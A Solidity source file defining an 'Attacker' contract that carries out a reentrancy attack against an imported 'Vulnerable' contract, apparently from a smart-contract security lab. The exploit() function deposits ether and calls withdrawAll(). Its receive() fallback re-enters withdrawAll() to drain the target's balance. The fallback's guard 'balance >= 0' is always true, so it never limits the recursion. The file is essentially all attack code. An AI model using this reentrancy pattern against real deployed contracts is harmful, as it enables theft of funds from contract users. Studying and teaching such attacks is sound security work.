// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Vulnerable} from "./Vulnerable.sol";

contract Attacker {
    Vulnerable public target;

    constructor(address _target) {
        target = Vulnerable(_target);
    }

    receive() external payable {
        if (address(target).balance >= 0) {
            target.withdrawAll();
        }
    }

    function exploit() public payable {
        require(msg.value >= 1 ether, "Exploit error!");
        target.deposit{value: msg.value}();
        target.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
